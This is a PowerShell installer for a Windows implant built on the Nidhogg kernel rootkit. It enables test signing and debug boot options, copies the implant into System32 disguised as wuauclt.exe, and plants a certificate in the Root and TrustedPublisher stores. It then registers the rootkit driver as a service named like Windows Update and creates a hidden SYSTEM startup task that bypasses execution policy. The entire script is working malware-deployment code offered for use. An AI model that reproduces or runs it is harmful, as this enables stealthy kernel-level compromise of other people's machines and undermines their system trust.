# Install_Implant_PreBoot.ps1 - Everything that needs a reboot
$TargetDir = "C:\Windows\System32"

Write-Host "[+] Pre-Boot Installation Starting..." -ForegroundColor Cyan

# === Enable Test Signing ===
$current = bcdedit /enum {current} | Select-String "testsigning"
if ($current -match "No") {
    Write-Host "[+] Enabling Test Signing + Debug..." -ForegroundColor Yellow
    bcdedit /set testsigning on | Out-Null
    bcdedit /set debug on | Out-Null
    Write-Host "   → REBOOT REQUIRED for Test Signing" -ForegroundColor Red
} else {
    Write-Host "[+] Test Signing already enabled." -ForegroundColor Green
}

# === Copy Core Files ===
Copy-Item ".\NidhoggClient.exe" "$TargetDir\wuauclt.exe" -Force
Copy-Item ".\Implant.ps1"       "$TargetDir\Implant.ps1" -Force
Copy-Item ".\Nidhogg.sys"       "$TargetDir\drivers\Nidhogg.sys" -Force

Write-Host "[+] Files copied" -ForegroundColor Green

# === Certificate ===
if (Test-Path ".\Nidhogg.cer") {
    $CertPath = "$env:TEMP\Nidhogg.cer"
    Copy-Item ".\Nidhogg.cer" $CertPath -Force
    certutil -addstore Root $CertPath | Out-Null
    certutil -addstore TrustedPublisher $CertPath | Out-Null
    Remove-Item $CertPath -Force -EA SilentlyContinue
    Write-Host "[+] Certificate installed" -ForegroundColor Green
}

# === Register Driver (will start after reboot) ===
sc.exe create "WindowsUpdateSvc" type= kernel start= auto binPath= "$TargetDir\drivers\Nidhogg.sys" | Out-Null
Write-Host "[+] Driver service registered" -ForegroundColor Green

# === Create Post-Boot Task (runs after reboot) ===
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-NoP -NonI -W Hidden -ExecutionPolicy Bypass -File `"$TargetDir\Run_Implant_PostBoot.ps1`""

$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "Windows Update Health Monitor - PostBoot" `
    -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null

Write-Host "`n=== Pre-Boot Phase Complete ===" -ForegroundColor Green
Write-Host "REBOOT NOW." -ForegroundColor Yellow